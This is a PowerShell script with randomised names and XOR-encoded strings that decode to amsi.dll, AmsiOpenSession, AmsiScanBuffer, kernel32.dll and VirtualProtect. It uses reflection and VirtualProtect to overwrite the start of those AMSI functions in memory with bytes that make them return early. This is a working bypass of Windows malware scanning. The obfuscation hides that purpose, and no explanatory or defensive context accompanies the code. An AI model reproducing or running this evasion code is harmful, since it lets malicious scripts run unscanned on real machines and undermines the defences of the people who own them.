
function nctcsppisj {

 Param ($moduleName, $functionName)

 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function oukdbhhpck {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
 DefineDynamicModule('InMemoryModule', $false).
 DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
  [System.MulticastDelegate])
  $type.
 DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
 SetImplementationFlags('Runtime, Managed')
 $type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

[Byte[]] $hwkuhlfmek =  0x48, 0x31, 0xC0
[byte[]] $bzamanohbv = 0x90
[byte[]] $otpjascmnp = 0xc3
[Byte[]] $qwzevvysgk =  $otpjascmnp + $bzamanohbv + $bzamanohbv
[Byte[]] $oxogfsfmiw = 0xd, 0x1, 0x1f, 0x5, 0x42, 0x8, 0x0, 0x0
[byte[]] $ipgspbtadm = 0x2d, 0x1, 0x1f, 0x5, 0x23, 0x1c, 0x9, 0x2, 0x3f, 0x9, 0x1f, 0x1f, 0x5, 0x3, 0x2
[Byte[]] $edjwhpodns = 0x1f, 0x15, 0x1f, 0x18, 0x9, 0x1, 0x42, 0x8, 0x0, 0x0
[byte[]] $ddqgtjrosl = 0x7, 0x9, 0x1e, 0x2, 0x9, 0x0, 0x5f, 0x5e, 0x42, 0x8, 0x0, 0x0
[Byte[]] $hhbzhjjkpk = 0x3a, 0x5, 0x1e, 0x18, 0x19, 0xd
[Byte[]] $alogctwvkt = 0x0, 0x3c, 0x1e, 0x3, 0x18, 0x9, 0xf, 0x18
[Byte[]] $xkymuortso = 0x2d, 0x1, 0x1f
[Byte[]] $nocuwfzkdg = 0x5, 0x3f, 0xf, 0xd, 0x2, 0x2e, 0x19, 0xa, 0xa, 0x9, 0x1e

for($i=0; $i -lt $oxogfsfmiw.count ; $i++)
{
    $oxogfsfmiw[$i] = $oxogfsfmiw[$i] -bxor 0x6c
}

$a = [System.Text.Encoding]::ASCII.GetString($oxogfsfmiw)

for($i=0; $i -lt $ipgspbtadm.count ; $i++)
{
    $ipgspbtadm[$i] = $ipgspbtadm[$i] -bxor 0x6c
}


$b = [System.Text.Encoding]::ASCII.GetString($ipgspbtadm)

for($i=0; $i -lt $edjwhpodns.count ; $i++)
{
    $edjwhpodns[$i] = $edjwhpodns[$i] -bxor 0x6c
}

$c = [System.Text.Encoding]::ASCII.GetString($edjwhpodns)

for($i=0; $i -lt $ddqgtjrosl.count ; $i++)
{
    $ddqgtjrosl[$i] = $ddqgtjrosl[$i] -bxor 0x6c
}

$d = [System.Text.Encoding]::ASCII.GetString($ddqgtjrosl)


for($i=0; $i -lt $hhbzhjjkpk.count ; $i++)
{
    $hhbzhjjkpk[$i] = $hhbzhjjkpk[$i] -bxor 0x6c
}
$e = [System.Text.Encoding]::ASCII.GetString($hhbzhjjkpk)


for($i=0; $i -lt $alogctwvkt.count ; $i++)
{
    $alogctwvkt[$i] = $alogctwvkt[$i] -bxor 0x6c
}

$f = [System.Text.Encoding]::ASCII.GetString($alogctwvkt)
$e = $e+$f


for($i=0; $i -lt $xkymuortso.count ; $i++)
{
    $xkymuortso[$i] = $xkymuortso[$i] -bxor 0x6c
}

$g = [System.Text.Encoding]::ASCII.GetString($xkymuortso)

for($i=0; $i -lt $nocuwfzkdg.count ; $i++)
{
    $nocuwfzkdg[$i] = $nocuwfzkdg[$i] -bxor 0x6c
}

$h = [System.Text.Encoding]::ASCII.GetString($nocuwfzkdg)
$g = $g+$h

$aaar = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((nctcsppisj $d $e), (oukdbhhpck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

if ([Environment]::Is64BitProcess -eq [Environment]::Is64BitOperatingSystem)
{
[IntPtr]$pajrwrlyfc = nctcsppisj $a $b
$vp.Invoke($pajrwrlyfc, 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy($hwkuhlfmek, 0, $pajrwrlyfc, 3)
$vp.Invoke($pajrwrlyfc, 3, 0x20, [ref]$aaar)
}
else
{
[IntPtr]$nplnaygpdk = nctcsppisj $a $g
$vp.Invoke($nplnaygpdk , 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy($qwzevvysgk, 0, $nplnaygpdk , 3)
$vp.Invoke($nplnaygpdk , 3, 0x20, [ref]$aaar)
}

